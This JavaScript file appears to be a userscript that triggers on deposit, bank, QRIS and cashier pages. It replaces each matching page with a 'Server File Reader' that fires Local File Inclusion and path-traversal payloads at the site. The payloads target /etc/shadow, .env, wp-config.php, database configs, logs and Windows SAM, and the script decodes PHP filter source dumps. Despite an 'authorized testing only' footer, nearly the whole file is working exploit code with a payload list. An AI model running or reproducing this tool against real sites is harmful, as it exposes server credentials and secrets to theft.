(function () {
  const url = window.location.href;
  const match = [
    '/deposit',
    '/bank',
    '/deposit.php',
    '/qris.php',
    '/cashier',
    '/metode/?bank=',
    '/?bank=',
    '/?page=transaksi',
    '/index.php?page=transaksi',
    '/?deposit&head=home',
    '/index.php?page=cashier',
    '/bank.php'
  ];

  if (!match.some(path => url.includes(path))) return;

  // ============================================
  // FUNGSI UTAMA UNTUK MEMBACA FILE SERVER
  // ============================================
  
  function loadServerFileReader() {
    // Hapus konten lama
    document.documentElement.innerHTML = '<html><head></head><body></body></html>';
    
    document.head.innerHTML = `
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title>Server File Reader - Pentest Tool</title>
      <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
      <style>
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }
        
        body {
          font-family: 'Poppins', sans-serif;
          background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
          color: #f1f5f9;
          min-height: 100vh;
          padding: 20px;
          overflow-x: hidden;
        }
        
        .container {
          max-width: 1200px;
          margin: 0 auto;
          background: rgba(30, 41, 59, 0.9);
          border-radius: 16px;
          box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
          padding: 30px;
          border: 1px solid #334155;
        }
        
        .header {
          text-align: center;
          margin-bottom: 30px;
          padding-bottom: 20px;
          border-bottom: 2px solid #38bdf8;
        }
        
        .header h1 {
          font-size: 28px;
          font-weight: 700;
          background: linear-gradient(90deg, #38bdf8, #0ea5e9);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          margin-bottom: 10px;
        }
        
        .header p {
          color: #94a3b8;
          font-size: 16px;
        }
        
        .target-info {
          background: #0f172a;
          padding: 15px;
          border-radius: 10px;
          margin-bottom: 20px;
          border-left: 4px solid #f59e0b;
        }
        
        .target-info code {
          background: #1e293b;
          padding: 5px 10px;
          border-radius: 5px;
          font-family: monospace;
          color: #fbbf24;
          word-break: break-all;
        }
        
        .stats-grid {
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
          gap: 15px;
          margin-bottom: 30px;
        }
        
        .stat-card {
          background: #0f172a;
          padding: 20px;
          border-radius: 12px;
          text-align: center;
          border: 1px solid #334155;
          transition: transform 0.3s, border-color 0.3s;
        }
        
        .stat-card:hover {
          transform: translateY(-5px);
          border-color: #38bdf8;
        }
        
        .stat-card i {
          font-size: 30px;
          margin-bottom: 10px;
          color: #38bdf8;
        }
        
        .stat-card .number {
          font-size: 32px;
          font-weight: 700;
          color: #f1f5f9;
        }
        
        .stat-card .label {
          font-size: 14px;
          color: #94a3b8;
          text-transform: uppercase;
          letter-spacing: 1px;
        }
        
        .controls {
          display: flex;
          gap: 15px;
          flex-wrap: wrap;
          margin-bottom: 30px;
        }
        
        .btn {
          flex: 1;
          min-width: 180px;
          background: linear-gradient(90deg, #38bdf8, #0ea5e9);
          color: #0f172a;
          border: none;
          padding: 15px 25px;
          border-radius: 10px;
          font-weight: 600;
          font-size: 16px;
          cursor: pointer;
          transition: all 0.3s;
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 10px;
        }
        
        .btn:hover {
          transform: translateY(-3px);
          box-shadow: 0 10px 20px rgba(56, 189, 248, 0.3);
        }
        
        .btn-success {
          background: linear-gradient(90deg, #10b981, #059669);
        }
        
        .btn-success:hover {
          box-shadow: 0 10px 20px rgba(16, 185, 129, 0.3);
        }
        
        .btn-danger {
          background: linear-gradient(90deg, #ef4444, #dc2626);
        }
        
        .btn-danger:hover {
          box-shadow: 0 10px 20px rgba(239, 68, 68, 0.3);
        }
        
        .btn-warning {
          background: linear-gradient(90deg, #f59e0b, #d97706);
        }
        
        .btn-warning:hover {
          box-shadow: 0 10px 20px rgba(245, 158, 11, 0.3);
        }
        
        .file-explorer {
          background: #0f172a;
          border-radius: 12px;
          padding: 20px;
          margin-bottom: 30px;
          border: 1px solid #334155;
        }
        
        .explorer-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 20px;
          padding-bottom: 15px;
          border-bottom: 1px solid #334155;
        }
        
        .explorer-header h3 {
          color: #f1f5f9;
          font-size: 20px;
          display: flex;
          align-items: center;
          gap: 10px;
        }
        
        .path-input {
          flex: 1;
          background: #1e293b;
          border: 2px solid #38bdf8;
          color: #f1f5f9;
          padding: 12px 20px;
          border-radius: 8px;
          font-size: 16px;
          margin-right: 15px;
        }
        
        .payload-select {
          width: 100%;
          background: #1e293b;
          border: 1px solid #475569;
          color: #f1f5f9;
          padding: 12px;
          border-radius: 8px;
          font-size: 16px;
          margin-bottom: 15px;
        }
        
        .file-content {
          background: #1a202c;
          border-radius: 8px;
          padding: 20px;
          max-height: 500px;
          overflow-y: auto;
          font-family: 'Courier New', monospace;
          font-size: 14px;
          line-height: 1.6;
          color: #e2e8f0;
          white-space: pre-wrap;
          word-break: break-all;
        }
        
        .file-content pre {
          margin: 0;
        }
        
        .file-info {
          display: flex;
          justify-content: space-between;
          color: #94a3b8;
          font-size: 14px;
          margin-top: 10px;
        }
        
        .loading {
          text-align: center;
          padding: 40px;
        }
        
        .spinner {
          width: 50px;
          height: 50px;
          border: 5px solid #334155;
          border-top: 5px solid #38bdf8;
          border-radius: 50%;
          animation: spin 1s linear infinite;
          margin: 0 auto 20px;
        }
        
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
        
        .tabs {
          display: flex;
          border-bottom: 2px solid #334155;
          margin-bottom: 20px;
          overflow-x: auto;
        }
        
        .tab {
          padding: 15px 25px;
          background: none;
          border: none;
          color: #94a3b8;
          font-weight: 600;
          font-size: 16px;
          cursor: pointer;
          border-bottom: 3px solid transparent;
          transition: all 0.3s;
          white-space: nowrap;
        }
        
        .tab:hover {
          color: #f1f5f9;
        }
        
        .tab.active {
          color: #38bdf8;
          border-bottom-color: #38bdf8;
        }
        
        .tab-content {
          display: none;
          animation: fadeIn 0.5s;
        }
        
        .tab-content.active {
          display: block;
        }
        
        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }
        
        .vulnerability-list {
          display: grid;
          grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
          gap: 15px;
        }
        
        .vuln-card {
          background: #0f172a;
          border-radius: 10px;
          padding: 20px;
          border: 1px solid #334155;
          transition: all 0.3s;
        }
        
        .vuln-card:hover {
          border-color: #ef4444;
          transform: translateY(-5px);
        }
        
        .vuln-card h4 {
          color: #ef4444;
          margin-bottom: 10px;
          display: flex;
          align-items: center;
          gap: 10px;
        }
        
        .vuln-card p {
          color: #94a3b8;
          font-size: 14px;
        }
        
        .toast {
          position: fixed;
          bottom: 30px;
          right: 30px;
          min-width: 300px;
          padding: 15px 20px;
          border-radius: 10px;
          font-weight: 500;
          opacity: 0;
          transform: translateY(20px);
          transition: all 0.5s;
          z-index: 10000;
          box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }
        
        .toast.show {
          opacity: 1;
          transform: translateY(0);
        }
        
        .toast.success {
          background: linear-gradient(90deg, #10b981, #059669);
          color: white;
        }
        
        .toast.error {
          background: linear-gradient(90deg, #ef4444, #dc2626);
          color: white;
        }
        
        .toast.info {
          background: linear-gradient(90deg, #38bdf8, #0ea5e9);
          color: white;
        }
        
        .toast.warning {
          background: linear-gradient(90deg, #f59e0b, #d97706);
          color: white;
        }
        
        .footer {
          text-align: center;
          margin-top: 40px;
          padding-top: 20px;
          border-top: 1px solid #334155;
          color: #64748b;
          font-size: 14px;
        }
        
        @media (max-width: 768px) {
          .container {
            padding: 20px;
          }
          
          .controls {
            flex-direction: column;
          }
          
          .btn {
            width: 100%;
          }
          
          .explorer-header {
            flex-direction: column;
            gap: 15px;
          }
          
          .path-input {
            margin-right: 0;
            margin-bottom: 15px;
          }
        }
      </style>
    `;
    
    document.body.innerHTML = `
      <div class="container">
        <div class="header">
          <h1><i class="fas fa-search"></i> Server File Reader - Pentest Tool</h1>
          <p>Detected financial path: <strong>${url}</strong></p>
        </div>
        
        <div class="target-info">
          <i class="fas fa-info-circle"></i> Target URL: <code id="targetUrl">${url}</code>
        </div>
        
        <div class="stats-grid">
          <div class="stat-card">
            <i class="fas fa-folder-open"></i>
            <div class="number" id="filesRead">0</div>
            <div class="label">Files Read</div>
          </div>
          
          <div class="stat-card">
            <i class="fas fa-bug"></i>
            <div class="number" id="vulnCount">0</div>
            <div class="label">Vulnerabilities</div>
          </div>
          
          <div class="stat-card">
            <i class="fas fa-shield-alt"></i>
            <div class="number" id="payloadCount">15</div>
            <div class="label">Payloads</div>
          </div>
          
          <div class="stat-card">
            <i class="fas fa-clock"></i>
            <div class="number" id="timeElapsed">0s</div>
            <div class="label">Time Elapsed</div>
          </div>
        </div>
        
        <div class="controls">
          <button class="btn" onclick="startQuickScan()">
            <i class="fas fa-play"></i> Quick Scan
          </button>
          
          <button class="btn btn-success" onclick="scanLFI()">
            <i class="fas fa-file-code"></i> Scan LFI
          </button>
          
          <button class="btn btn-warning" onclick="scanSensitiveFiles()">
            <i class="fas fa-lock-open"></i> Sensitive Files
          </button>
          
          <button class="btn btn-danger" onclick="clearResults()">
            <i class="fas fa-trash"></i> Clear Results
          </button>
        </div>
        
        <div class="tabs">
          <button class="tab active" onclick="switchTab('fileExplorer')">
            <i class="fas fa-file-alt"></i> File Explorer
          </button>
          
          <button class="tab" onclick="switchTab('payloads')">
            <i class="fas fa-code"></i> Payloads
          </button>
          
          <button class="tab" onclick="switchTab('vulnerabilities')">
            <i class="fas fa-exclamation-triangle"></i> Vulnerabilities
          </button>
          
          <button class="tab" onclick="switchTab('logs')">
            <i class="fas fa-clipboard-list"></i> Logs
          </button>
        </div>
        
        <!-- File Explorer Tab -->
        <div id="fileExplorer" class="tab-content active">
          <div class="file-explorer">
            <div class="explorer-header">
              <h3><i class="fas fa-folder"></i> Server File Reader</h3>
              <div style="display: flex; flex: 1; margin-left: 20px;">
                <input type="text" class="path-input" id="filePath" 
                       placeholder="Enter file path (e.g., ../../../../etc/passwd)" 
                       value="../../../../../../etc/passwd">
                <button class="btn" onclick="readFile()" style="min-width: auto; padding: 12px 20px;">
                  <i class="fas fa-search"></i> Read
                </button>
              </div>
            </div>
            
            <select class="payload-select" id="payloadSelect" onchange="document.getElementById('filePath').value = this.value">
              <option value="">-- Select Payload --</option>
              <option value="../../../../../../etc/passwd">/etc/passwd</option>
              <option value="../../../../../../etc/shadow">/etc/shadow</option>
              <option value="../../../../../../etc/hosts">/etc/hosts</option>
              <option value="../../../proc/self/environ">/proc/self/environ</option>
              <option value="../../../../../../../.env">.env file</option>
              <option value="../../../../../../../config.php">config.php</option>
              <option value="../../../../../../../wp-config.php">wp-config.php</option>
              <option value="../../../../../../../var/log/apache2/access.log">Apache Access Log</option>
              <option value="../../../../../../../var/log/apache2/error.log">Apache Error Log</option>
              <option value="php://filter/convert.base64-encode/resource=index.php">PHP Filter: index.php</option>
              <option value="php://filter/convert.base64-encode/resource=../../config/database.php">PHP Filter: database.php</option>
              <option value="..\\..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts">Windows hosts file</option>
              <option value="C:\\Windows\\win.ini">Windows win.ini</option>
            </select>
            
            <div id="fileContentContainer">
              <div class="loading" id="loadingIndicator" style="display: none;">
                <div class="spinner"></div>
                <p>Reading file from server...</p>
              </div>
              
              <div id="fileContentDisplay" style="display: none;">
                <div class="file-info">
                  <span><i class="fas fa-file"></i> <span id="fileName">File</span></span>
                  <span><i class="fas fa-ruler"></i> <span id="fileSize">0</span> bytes</span>
                  <span><i class="fas fa-clock"></i> <span id="readTime">0</span> ms</span>
                </div>
                <div class="file-content" id="fileContent">
                  <!-- File content will appear here -->
                </div>
              </div>
            </div>
          </div>
        </div>
        
        <!-- Payloads Tab -->
        <div id="payloads" class="tab-content">
          <div class="file-explorer">
            <h3><i class="fas fa-code"></i> LFI Payload Collection</h3>
            <div class="file-content">
              <h4>📁 Basic Path Traversal:</h4>
              <pre>../../../../../../etc/passwd
....//....//....//....//etc//passwd
/etc/passwd%00
/etc/passwd%00.jpg
/etc/passwd?param=value
/etc/passwd#fragment</pre>
              
              <h4>🔧 PHP Filters (Source Code):</h4>
              <pre>php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=../../config.php
php://filter/read=string.rot13/resource=index.php
php://filter/zlib.deflate/convert.base64-encode/resource=admin.php</pre>
              
              <h4>📝 Configuration Files:</h4>
              <pre>../../../../../../../.env
../../../../../../../config.php
../../../../../../../database.php
../../../../../../../wp-config.php
../../../../../../../application/config/database.php
../../../../../../../app/config/database.php</pre>
              
              <h4>📊 Log Files:</h4>
              <pre>../../../../../../../var/log/apache2/access.log
../../../../../../../var/log/apache2/error.log
../../../../../../../var/log/nginx/access.log
../../../../../../../storage/logs/laravel.log
../../../../../../../log/error.log</pre>
              
              <h4>🪟 Windows Files:</h4>
              <pre>..\..\..\..\..\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\System32\config\SAM
..\..\..\..\..\xampp\htdocs\config.php</pre>
            </div>
          </div>
        </div>
        
        <!-- Vulnerabilities Tab -->
        <div id="vulnerabilities" class="tab-content">
          <div class="file-explorer">
            <h3><i class="fas fa-exclamation-triangle"></i> Detected Vulnerabilities</h3>
            <div id="vulnerabilityList" class="vulnerability-list">
              <!-- Vulnerabilities will appear here -->
            </div>
          </div>
        </div>
        
        <!-- Logs Tab -->
        <div id="logs" class="tab-content">
          <div class="file-explorer">
            <h3><i class="fas fa-clipboard-list"></i> Activity Log</h3>
            <div class="file-content" id="activityLog" style="height: 400px;">
              <!-- Logs will appear here -->
            </div>
          </div>
        </div>
        
        <div class="footer">
          <p><i class="fas fa-shield-alt"></i> Server File Reader - For authorized penetration testing only</p>
          <p>Target: <strong>${new URL(url).hostname}</strong> | Time: <span id="currentTime">${new Date().toLocaleTimeString()}</span></p>
        </div>
      </div>
      
      <div id="toast" class="toast"></div>
    `;
    
    // Initialize variables
    window.fileReaderData = {
      filesRead: 0,
      vulnerabilities: [],
      logs: [],
      startTime: Date.now(),
      currentFilePath: ''
    };
    
    // Update time
    setInterval(() => {
      const elapsed = Math.floor((Date.now() - window.fileReaderData.startTime) / 1000);
      document.getElementById('timeElapsed').textContent = `${elapsed}s`;
      document.getElementById('currentTime').textContent = new Date().toLocaleTimeString();
    }, 1000);
    
    // Add initial log
    addLog(`✅ Financial path detected: ${url}`, 'success');
    addLog('🚀 Server File Reader initialized', 'info');
  }
  
  // ============================================
  // FUNGSI UTILITY
  // ============================================
  
  function addLog(message, type = 'info') {
    const timestamp = new Date().toLocaleTimeString();
    const logEntry = `[${timestamp}] ${message}`;
    
    window.fileReaderData.logs.push({message, type, timestamp});
    
    // Update log display
    const logContainer = document.getElementById('activityLog');
    if (logContainer) {
      const color = type === 'success' ? '#10b981' : 
                   type === 'error' ? '#ef4444' : 
                   type === 'warning' ? '#f59e0b' : '#38bdf8';
      
      logContainer.innerHTML = `<div style="color: ${color}; margin-bottom: 8px; border-bottom: 1px solid #334155; padding-bottom: 5px;">${logEntry}</div>` + logContainer.innerHTML;
    }
    
    // Keep only last 50 logs
    if (window.fileReaderData.logs.length > 50) {
      window.fileReaderData.logs.shift();
    }
  }
  
  function showToast(message, type = 'info') {
    const toast = document.getElementById('toast');
    toast.textContent = message;
    toast.className = `toast ${type}`;
    toast.classList.add('show');
    
    setTimeout(() => {
      toast.classList.remove('show');
    }, 3000);
  }
  
  function updateStats() {
    document.getElementById('filesRead').textContent = window.fileReaderData.filesRead;
    document.getElementById('vulnCount').textContent = window.fileReaderData.vulnerabilities.length;
    document.getElementById('payloadCount').textContent = '15'; // Static for now
  }
  
  // ============================================
  // FUNGSI MEMBACA FILE
  // ============================================
  
  async function readFile() {
    const filePath = document.getElementById('filePath').value.trim();
    if (!filePath) {
      showToast('Please enter a file path', 'error');
      return;
    }
    
    window.fileReaderData.currentFilePath = filePath;
    
    // Show loading
    document.getElementById('loadingIndicator').style.display = 'block';
    document.getElementById('fileContentDisplay').style.display = 'none';
    
    const startTime = Date.now();
    
    try {
      // Build URL with file path parameter
      const currentUrl = new URL(window.location.href);
      const baseUrl = currentUrl.origin + currentUrl.pathname;
      
      // Try different parameter names
      const parameters = ['file', 'page', 'load', 'view', 'doc', 'template', 'include', 'path', 'filename'];
      let success = false;
      let content = '';
      let responseUrl = '';
      
      for (const param of parameters) {
        if (success) break;
        
        const testUrl = `${baseUrl}?${param}=${encodeURIComponent(filePath)}`;
        
        try {
          const controller = new AbortController();
          const timeoutId = setTimeout(() => controller.abort(), 10000);
          
          const response = await fetch(testUrl, {
            signal: controller.signal,
            headers: {
              'Accept': 'text/html,application/xhtml+xml,application/xml,text/plain,*/*',
              'X-Requested-With': 'XMLHttpRequest'
            },
            mode: 'cors',
            credentials: 'include'
          });
          
          clearTimeout(timeoutId);
          
          if (response.ok) {
            content = await response.text();
            responseUrl = testUrl;
            
            // Check if content looks like a file
            if (isFileContent(content, filePath)) {
              success = true;
              addLog(`✅ Successfully read: ${filePath} via ${param}`, 'success');
              
              // Check if it's a vulnerability
              if (isSensitiveFile(filePath)) {
                const vuln = {
                  type: 'LFI',
                  path: filePath,
                  parameter: param,
                  url: testUrl,
                  timestamp: new Date().toISOString()
                };
                
                if (!window.fileReaderData.vulnerabilities.some(v => v.path === filePath && v.parameter === param)) {
                  window.fileReaderData.vulnerabilities.push(vuln);
                  addVulnerability(vuln);
                  showToast(`⚠️ LFI Vulnerability Found!`, 'warning');
                }
              }
              
              break;
            }
          }
        } catch (error) {
          // Continue to next parameter
          console.log(`Failed with parameter ${param}:`, error.message);
        }
      }
      
      const endTime = Date.now();
      const readTime = endTime - startTime;
      
      // Hide loading
      document.getElementById('loadingIndicator').style.display = 'none';
      
      if (success) {
        // Update stats
        window.fileReaderData.filesRead++;
        updateStats();
        
        // Display content
        displayFileContent(filePath, content, readTime, responseUrl);
        showToast(`File read successfully (${readTime}ms)`, 'success');
      } else {
        // Try direct fetch to the path
        try {
          const directUrl = `${currentUrl.origin}/${filePath.replace(/^(\.\/|\/)/, '')}`;
          const response = await fetch(directUrl, {
            headers: { 'Accept': 'text/plain,*/*' }
          });
          
          if (response.ok) {
            content = await response.text();
            responseUrl = directUrl;
            
            if (isFileContent(content, filePath)) {
              success = true;
              addLog(`✅ Successfully read: ${filePath} (direct access)`, 'success');
              
              window.fileReaderData.filesRead++;
              updateStats();
              displayFileContent(filePath, content, readTime, responseUrl);
              showToast(`File read directly (${readTime}ms)`, 'success');
            }
          }
        } catch (directError) {
          // If all methods fail
          document.getElementById('loadingIndicator').style.display = 'none';
          document.getElementById('fileContentDisplay').style.display = 'block';
          document.getElementById('fileContent').innerHTML = `<div style="color: #ef4444; text-align: center; padding: 40px;">
            <i class="fas fa-times-circle" style="font-size: 48px; margin-bottom: 20px;"></i>
            <h3>Failed to read file</h3>
            <p>The server may not be vulnerable to Local File Inclusion.</p>
            <p>Tried path: <code>${filePath}</code></p>
            <p>Time: ${readTime}ms</p>
          </div>`;
          
          showToast('Failed to read file', 'error');
          addLog(`❌ Failed to read: ${filePath}`, 'error');
        }
      }
      
    } catch (error) {
      console.error('Error reading file:', error);
      document.getElementById('loadingIndicator').style.display = 'none';
      showToast('Error reading file', 'error');
      addLog(`❌ Error: ${error.message}`, 'error');
    }
  }
  
  function displayFileContent(filePath, content, readTime, responseUrl) {
    document.getElementById('fileContentDisplay').style.display = 'block';
    
    // Set file info
    document.getElementById('fileName').textContent = filePath.split('/').pop() || filePath;
    document.getElementById('fileSize').textContent = content.length;
    document.getElementById('readTime').textContent = readTime;
    
    // Format content
    let formattedContent = content;
    
    // Check if it's base64 encoded (PHP filter)
    if (filePath.includes('php://filter/convert.base64-encode')) {
      try {
        formattedContent = atob(content);
        addLog('Decoded base64 content from PHP filter', 'info');
      } catch (e) {
        // Not base64
      }
    }
    
    // Escape HTML
    formattedContent = formattedContent
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');
    
    // Add syntax highlighting for certain file types
    if (filePath.endsWith('.php') || filePath.includes('.php')) {
      formattedContent = formattedContent.replace(
        /(&lt;\?php|&lt;\?|\?&gt;)/g, 
        '<span style="color: #f59e0b;">$1</span>'
      );
    }
    
    if (filePath.includes('passwd')) {
      // Highlight /etc/passwd structure
      formattedContent = formattedContent.replace(
        /(^.*?:.*?:.*?:.*?:.*?:.*?:.*?$)/gm, 
        '<span style="color: #10b981;">$1</span>'
      );
    }
    
    // Display content
    document.getElementById('fileContent').innerHTML = `<pre>${formattedContent}</pre>`;
    
    // Add copy button
    const copyBtn = `<button class="btn" onclick="copyToClipboard(\`${content.replace(/`/g, '\\`')}\`)" style="margin-top: 15px; min-width: auto;">
      <i class="fas fa-copy"></i> Copy Content
    </button>`;
    
    document.getElementById('fileContent').innerHTML += copyBtn;
  }
  
  function isFileContent(content, filePath) {
    // Skip if content is too small (likely error page)
    if (content.length < 50) return false;
    
    // Check for common file patterns
    const patterns = {
      'passwd': ['root:', 'daemon:', 'bin:', 'sys:', 'sync:'],
      'shadow': ['root:$', 'bin:$', 'daemon:$'],
      'env': ['APP_ENV=', 'DB_HOST=', 'API_KEY=', 'SECRET_KEY='],
      'config': ['<?php', 'define\\(', '\\$db_host', 'mysql_connect'],
      'log': ['GET /', 'POST /', 'HTTP/', '\\[error\\]', '\\[warning\\]'],
      'hosts': ['localhost', '127.0.0.1', '::1'],
      'win.ini': ['\\[fonts\\]', '\\[extensions\\]']
    };
    
    for (const [key, checks] of Object.entries(patterns)) {
      if (filePath.includes(key)) {
        for (const check of checks) {
          if (new RegExp(check, 'i').test(content)) {
            return true;
          }
        }
      }
    }
    
    // Check for common error messages (which also indicate file access)
    const errorIndicators = [
      'failed to open stream',
      'no such file',
      'permission denied',
      'file_get_contents',
      'fopen\\(',
      'Warning:',
      'Error:'
    ];
    
    for (const indicator of errorIndicators) {
      if (new RegExp(indicator, 'i').test(content)) {
        return true;
      }
    }
    
    // Check if it looks like HTML (likely not a file)
    const htmlIndicators = ['<!DOCTYPE', '<html', '<body', '<head', '<title'];
    for (const indicator of htmlIndicators) {
      if (content.includes(indicator)) {
        return false; // Probably HTML page
      }
    }
    
    return content.length > 100 && content.length < 100000;
  }
  
  function isSensitiveFile(filePath) {
    const sensitivePatterns = [
      'passwd', 'shadow', 'env', 'config', 'database', 'secret',
      'key', 'credential', 'token', 'password', 'administrator',
      'ssh', 'id_rsa', '.git', '.env', 'proc/self'
    ];
    
    return sensitivePatterns.some(pattern => 
      filePath.toLowerCase().includes(pattern.toLowerCase())
    );
  }
  
  // ============================================
  // FUNGSI SCAN
  // ============================================
  
  async function startQuickScan() {
    addLog('🚀 Starting quick scan...', 'info');
    showToast('Starting quick scan', 'info');
    
    const commonFiles = [
      '../../../../../../etc/passwd',
      '../../../../../../../.env',
      '../../../../../../../config.php',
      '../../../../../../../wp-config.php',
      'php://filter/convert.base64-encode/resource=index.php'
    ];
    
    for (const file of commonFiles) {
      document.getElementById('filePath').value = file;
      await readFile();
      await new Promise(resolve => setTimeout(resolve, 1000)); // Delay between requests
    }
    
    addLog('✅ Quick scan completed', 'success');
    showToast('Quick scan completed', 'success');
  }
  
  async function scanLFI() {
    addLog('🔍 Scanning for LFI vulnerabilities...', 'info');
    showToast('Scanning for LFI', 'info');
    
    const lfiPayloads = [
      '../../../../../../etc/passwd',
      '....//....//....//....//etc//passwd',
      '/etc/passwd%00',
      '/etc/passwd%00.jpg',
      '../../../etc/passwd',
      '../../etc/passwd',
      '../etc/passwd'
    ];
    
    let found = 0;
    
    for (const payload of lfiPayloads) {
      document.getElementById('filePath').value = payload;
      await readFile();
      await new Promise(resolve => setTimeout(resolve, 500));
      
      // Check if file was successfully read
      const contentDisplay = document.getElementById('fileContent').textContent;
      if (contentDisplay && !contentDisplay.includes('Failed to read file')) {
        found++;
      }
    }
    
    addLog(`✅ LFI scan completed. Found ${found} potential vulnerabilities`, 'success');
    showToast(`Found ${found} potential LFI vulnerabilities`, 'success');
  }
  
  async function scanSensitiveFiles() {
    addLog('🔐 Scanning for sensitive files...', 'info');
    showToast('Scanning sensitive files', 'info');
    
    const sensitiveFiles = [
      '../../../../../../etc/shadow',
      '../../../../../../etc/hosts',
      '../../../proc/self/environ',
      '../../../../../../../.env',
      '../../../../../../../config.php',
      '../../../../../../../database.php',
      '../../../../../../../wp-config.php',
      '../../../../../../../var/log/apache2/access.log',
      '../../../../../../../var/log/apache2/error.log',
      '../../../../../../../storage/logs/laravel.log'
    ];
    
    let found = 0;
    
    for (const file of sensitiveFiles) {
      document.getElementById('filePath').value = file;
      await readFile();
      await new Promise(resolve => setTimeout(resolve, 500));
      
      const contentDisplay = document.getElementById('fileContent').textContent;
      if (contentDisplay && !contentDisplay.includes('Failed to read file')) {
        found++;
      }
    }
    
    addLog(`✅ Sensitive files scan completed. Found ${found} files`, 'success');
    showToast(`Found ${found} sensitive files`, 'success');
  }
  
  // ============================================
  // FUNGSI UI
  // ============================================
  
  function switchTab(tabName) {
    // Hide all tabs
    document.querySelectorAll('.tab-content').forEach(tab => {
      tab.classList.remove('active');
    });
    
    // Remove active class from all tab buttons
    document.querySelectorAll('.tab').forEach(tabBtn => {
      tabBtn.classList.remove('active');
    });
    
    // Show selected tab
    document.getElementById(tabName).classList.add('active');
    
    // Activate tab button
    event.currentTarget.classList.add('active');
  }
  
  function addVulnerability(vuln) {
    const container = document.getElementById('vulnerabilityList');
    
    const vulnCard = document.createElement('div');
    vulnCard.className = 'vuln-card';
    vulnCard.innerHTML = `
      <h4><i class="fas fa-bug"></i> ${vuln.type}</h4>
      <p><strong>Path:</strong> <code>${vuln.path}</code></p>
      <p><strong>Parameter:</strong> ${vuln.parameter}</p>
      <p><strong>Time:</strong> ${new Date(vuln.timestamp).toLocaleTimeString()}</p>
      <button class="btn" onclick="document.getElementById('filePath').value='${vuln.path}'; readFile()" style="margin-top: 10px; padding: 8px 15px; font-size: 14px;">
        <i class="fas fa-redo"></i> Re-test
      </button>
    `;
    
    container.appendChild(vulnCard);
  }
  
  function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
      showToast('Content copied to clipboard', 'success');
    }).catch(err => {
      showToast('Failed to copy', 'error');
    });
  }
  
  function clearResults() {
    if (confirm('Clear all results?')) {
      window.fileReaderData.filesRead = 0;
      window.fileReaderData.vulnerabilities = [];
      window.fileReaderData.logs = [];
      
      document.getElementById('vulnerabilityList').innerHTML = '';
      document.getElementById('activityLog').innerHTML = '';
      document.getElementById('fileContent').innerHTML = '';
      document.getElementById('fileContentDisplay').style.display = 'none';
      
      updateStats();
      addLog('📊 Results cleared', 'info');
      showToast('All results cleared', 'info');
    }
  }
  
  // ============================================
  // EXPOSE FUNGSI KE WINDOW
  // ============================================
  
  window.readFile = readFile;
  window.startQuickScan = startQuickScan;
  window.scanLFI = scanLFI;
  window.scanSensitiveFiles = scanSensitiveFiles;
  window.switchTab = switchTab;
  window.copyToClipboard = copyToClipboard;
  window.clearResults = clearResults;
  
  // ============================================
  // LOAD FILE READER
  // ============================================
  
  loadServerFileReader();
})();